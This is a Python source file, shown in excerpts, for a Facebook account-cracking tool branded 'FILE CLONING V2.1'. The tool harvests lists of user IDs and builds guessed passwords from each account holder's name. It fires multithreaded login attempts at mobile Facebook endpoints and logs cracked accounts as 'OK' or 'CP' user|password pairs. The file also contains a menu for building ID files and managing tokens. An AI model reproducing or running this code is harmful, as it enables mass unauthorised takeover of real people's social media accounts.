...
\033[1;97m-----------------------------------------------
\033[1;96m➣ \033[1;93mCREATER   \033[1;96m: \033[1;93mJanzada Khan
\033[1;96m➣ \033[1;93mFACEBOOK    \033[1;96m: \033[1;93mJanzada Khan
\033[1;96m➣ \033[1;93mWHATSAPP    \033[1;96m: \033[1;93m03099006070
\033[1;96m➣ \033[1;93mTOOL VERSION  \033[1;92m: \033[1;93mFILE CLONING V2.1
\033[1;97m-----------------------------------------------"""
...
def janzadakhan():
    ...
    todz = ''
    IP = ipm['origin']
    print('\033[1;93m [01] \033[1;35mSTART CLONING')
    print(' \033[1;94m[02] \033[1;35mCREATE FILE ')
    print(' \033[1;93m[03] \033[1;35mSEPARATE IDZ ')
    print(' \033[1;95m[04] \033[1;35mDUBLE IDZ CUT FROM FILR ')
    print(' \033[1;96m[05] \033[1;97mREMOVE EXPIRE TOKEN')
    print('\033[1;93m [00] \033[1;97mEXIT ')
    print('\033[1;97m-----------------------------------------------')
    _jjanzada___ = input('\033[1;93m[•] \033[1;97mChoose : ')
    if _jjanzada___ in ('1', '01'):
        os.system('clear');__xxx__().janzadax(id)
    if _jjanzada___ in ('02', '2'):
        os.system('clear');publik()
    if _jjanzada___ in ('3', '03'):
    	os.system('clear');print(logo);sep()
    if _jjanzada___ in ('4', '04'):
    	os.system('clear');dupcutter()
    if _jjanzada___ in ('5', '05'):
        time.sleep(2)
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;97m[FaiSyl] {loop}~{len(self.id)} \x1b[1;92mOK={len(ok)}\x1b[1;97m/\x1b[1;91mCP={len(cp)} ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[Janzada-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    ...
                    try:
                        ...
                        print('\r%s[Janzada-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with jaanzada(max_workers=40) as janzada:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0] +' '+ xz[1], xz[0].lower() +' '+ xz[1].lower(), xz[0].lower() + xz[1].lower()]
                        if jbg == '1':
                            janzada.submit(self.__metode__, uid, pwx, "free.facebook.com")
                        elif jbg == '2':
                            janzada.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            janzada.submit(self.__metode__, uid, pwx, "m.facebook.com")
                        else:
                            janzada.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            ...
            print(47*"-")
            with janzada(max_workers=40) as janzada:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
...
def _f_a_md__eck():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+923099006070')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def publik():
    ...
    try:
        try:
            ...
            login()
        print(logo)
        print('       %s[%s•%s] %sExample : 10008127084332|100807801156|1000808764'%(J,P,J,P))
